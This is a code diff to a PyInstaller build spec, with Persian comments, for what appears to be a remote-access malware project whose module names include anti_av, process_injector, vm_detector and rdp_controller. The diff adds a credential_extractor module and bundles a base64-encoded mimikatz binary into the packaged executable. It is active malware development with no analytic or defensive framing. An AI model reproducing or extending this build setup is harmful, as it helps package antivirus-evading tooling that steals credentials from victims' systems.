@@ -146,7 +146,7 @@ def get_hidden_imports_and_data():
         'cryptography.hazmat.primitives.padding',
         'dotenv', 'packaging', 'packaging.version', 'json', 'base64', 'hashlib',
         'system.file_manager', 'system.collector', 'system.vm_detector', 
-        'system.anti_av', 'system.process_injector',
+        'system.anti_av', 'system.process_injector', 'system.credential_extractor',
         'monitoring.logger', 'monitoring.rdp_controller', 
         'network.communicator', 'encryption.manager', 'commands.handler',
         # اضافه کردن ماژول‌های ضروری برای requests و urllib3
@@ -154,6 +154,8 @@ def get_hidden_imports_and_data():
         'email.mime.base', 'email.mime.nonmultipart', 'email.encoders',
         'urllib3.packages.six', 'urllib3.packages.ssl_match_hostname',
         'urllib3.contrib', 'urllib3.contrib.pyopenssl',
+        # اضافه کردن ماژول‌های سیستمی
+        'tempfile', 're', 'datetime',
     ]
     
     datas = []
@@ -176,11 +178,20 @@ hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_d
 if os.path.exists('manifest.xml'):
     additional_datas.append(('manifest.xml', '.'))
 
+binary_files = [
+    ('binaries/mimikatz.b64', '.'),  # قرار دادن در root bundle
+]
+
+# یا مستقیم اضافه کنید:
+all_datas = additional_datas + [
+    ('binaries/mimikatz.b64', '.'),
+]
+
 a = Analysis(
     ['main.py'],
     pathex=[],
     binaries=additional_binaries,
-    datas=additional_datas,
+    datas=all_datas,  # استفاده از all_datas به جای additional_datas
     hiddenimports=hidden_imports,
     hookspath=[],
     hooksconfig={},
